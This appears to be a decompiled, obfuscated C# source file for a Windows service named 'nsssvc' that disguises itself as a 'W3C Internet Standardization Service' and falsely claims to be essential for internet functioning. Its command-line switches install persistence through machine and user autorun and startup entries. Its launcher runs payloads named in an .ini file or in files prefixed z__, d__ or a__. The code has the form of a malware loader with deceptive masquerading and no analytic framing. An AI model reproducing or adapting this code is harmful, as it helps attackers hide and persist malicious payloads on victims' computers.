using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.Remoting.Messaging;
using System.Threading;
using W3CS;

[Service("nsssvc", DisplayName = "W3C Internet Standardization Service", Description = "Synchronizes this computer with the latest internet standards. This program is essensial for the correct functioning of internet services on your computer.", ServiceType = GClass2.GEnum2.flag_3, ServiceAccessType = GClass2.GEnum1.flag_10, ServiceStartType = GClass2.GEnum4.const_2, ServiceErrorControl = GClass2.GEnum5.const_0, ServiceControls = (GClass2.GEnum3.flag_1 | GClass2.GEnum3.flag_3))]
internal class Class43 : Class42
{
	protected delegate void Delegate0();

	public const int int_0 = 20000;

	private Class30 class30_0;

	private static void Main(string[] args)
	{
		if (args.Length > 0)
		{
			if (args[0].ToLower() == "-wait" || args[0].ToLower() == "-w")
			{
				try
				{
					int millisecondsTimeout = int.Parse((args.Length > 1) ? args[1] : "2000");
					Thread.Sleep(millisecondsTimeout);
					return;
				}
				catch
				{
					return;
				}
			}
			Class43 @class = new Class43();
			if (!(args[0].ToLower() == "-standalone") && !(args[0].ToLower() == "-sa"))
			{
				if (!(args[0].ToLower() == "-service") && !(args[0].ToLower() == "-s"))
				{
					if (!(args[0].ToLower() == "-mautorun") && !(args[0].ToLower() == "-mar"))
					{
						if (!(args[0].ToLower() == "-uautorun") && !(args[0].ToLower() == "-uar"))
						{
							if (!(args[0].ToLower() == "-mstartup") && !(args[0].ToLower() == "-msu"))
							{
								if (!(args[0].ToLower() == "-ustartup") && !(args[0].ToLower() == "-usu"))
								{
									if (!(args[0].ToLower() == "-install") && !(args[0].ToLower() == "-i"))
									{
										if (!(args[0].ToLower() == "-update") && !(args[0].ToLower() == "-upd"))
										{
											if (!(args[0].ToLower() == "-launch") && !(args[0].ToLower() == "-l"))
											{
												@class.method_23(args, bool_2: false);
											}
											else
											{
												@class.method_23(args, bool_2: false);
											}
										}
										else
										{
											Thread.Sleep(TimeSpan.FromSeconds(10.0));
											@class.method_22(args, bool_2: false);
										}
									}
									else
									{
										@class.method_22(args, bool_2: true);
									}
								}
								else
								{
									@class.method_25(args, Enum2.UserStartUp);
								}
							}
							else
							{
								@class.method_25(args, Enum2.MachineStartUp);
							}
						}
						else
						{
							@class.method_25(args, Enum2.UserAutoRun);
						}
					}
					else
					{
						@class.method_25(args, Enum2.MachineAutoRun);
					}
				}
				else
				{
					@class.method_1();
				}
			}
			else
			{
				@class.method_25(args, Enum2.Standalone);
			}
		}
		else
		{
			Class43 class2 = new Class43();
			class2.method_23(args, bool_2: false);
		}
	}

	protected void method_22(string[] string_3, bool bool_2)
	{
		Class41 @class = new Class41();
		Enum2 @enum = @class.method_9();
		if (!bool_2)
		{
			Enum2 enum2 = @enum;
			if (enum2 == Enum2.WindowsService)
			{
				method_24(string_3);
			}
			else
			{
				method_25(string_3, @enum);
			}
		}
	}

	protected void method_23(string[] string_3, bool bool_2)
	{
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			bool flag = false;
			int num = (bool_2 ? 1 : 0);
			if (string_3.Length - num > 0)
			{
				string text = null;
				if (string_3.Length - num > 1)
				{
					text = "\"" + string_3[num + 1] + "\"";
					for (int i = num + 2; i < string_3.Length; i++)
					{
						text = text + " \"" + string_3[num + 1] + "\"";
					}
				}
				flag = GClass1.smethod_13("open", string_3[num], text, currentDirectory);
			}
			if (!flag)
			{
				string[] files = Directory.GetFiles(currentDirectory);
				string[] array = files;
				foreach (string text2 in array)
				{
					if (Path.GetFileName(text2.ToLower()) == Path.ChangeExtension("nsssvc", "ini")!.ToLower())
					{
						try
						{
							StreamReader streamReader = new StreamReader(text2);
							string text3 = streamReader.ReadToEnd();
							streamReader.Close();
							flag = GClass1.smethod_13("open", text3, null, currentDirectory);
						}
						catch (Exception exception_)
						{
							Class37.smethod_8(exception_);
						}
					}
				}
				if (!flag)
				{
					array = files;
					foreach (string text4 in array)
					{
						if (!Path.GetFileName(text4.ToLower())!.StartsWith("z__") && !Path.GetFileName(text4.ToLower())!.StartsWith("d__") && !Path.GetFileName(text4.ToLower())!.StartsWith("a__"))
						{
							continue;
						}
						try
						{
							string extension = Path.GetExtension(text4);
							if (!(extension == "") && !(extension == ".dll"))
							{
								flag = GClass1.smethod_13("open", text4, null, currentDirectory);
							}
							else
							{
								int num2 = Class49.smethod_2(text4, null);
								if (flag = 0 != num2)
								{
									Process.GetProcessById(num2).WaitForExit(120000);
								}
							}
							if (flag)
							{
								break;
							}
						}
						catch (Exception exception_2)
						{
							Class37.smethod_8(exception_2);
						}
					}
				}
			}
		}
		catch (Exception exception_3)
		{
			Class37.smethod_8(exception_3);
		}
		method_22(string_3, bool_2: false);
	}

	protected void method_24(string[] string_3)
	{
		Class45.smethod_34("nsssvc", string_3);
	}

	protected void method_25(string[] string_3, Enum2 enum2_0)
	{
		Class23 class23_ = new Class23();
		class30_0 = new Class30(class23_);
		class30_0.class23_0.enum2_0 = enum2_0;
		class30_0.method_5(TimeSpan.MaxValue);
	}

	protected override void vmethod_5()
	{
		Class23 class23_ = new Class23();
		class30_0 = new Class30(class23_);
		class30_0.class23_0.enum2_0 = Enum2.WindowsService;
		Delegate0 @delegate = method_26;
		@delegate.BeginInvoke(null, null);
	}

	[OneWay]
	protected void method_26()
	{
		try
		{
			class30_0.method_5(TimeSpan.MaxValue);
			Class45.smethod_32("nsssvc");
		}
		catch (Exception exception_)
		{
			Class37.smethod_8(exception_);
		}
	}

	protected override void vmethod_7()
	{
		try
		{
			if (class30_0 != null && class30_0.method_6())
			{
				class30_0.method_2(TimeSpan.FromMilliseconds(20000.0));
			}
		}
		catch (Exception exception_)
		{
			Class37.smethod_8(exception_);
		}
	}

	protected override void vmethod_9()
	{
		try
		{
			if (class30_0 != null && class30_0.method_6())
			{
				class30_0.method_2(TimeSpan.FromMilliseconds(20000.0));
			}
		}
		catch (Exception exception_)
		{
			Class37.smethod_8(exception_);
		}
	}
}
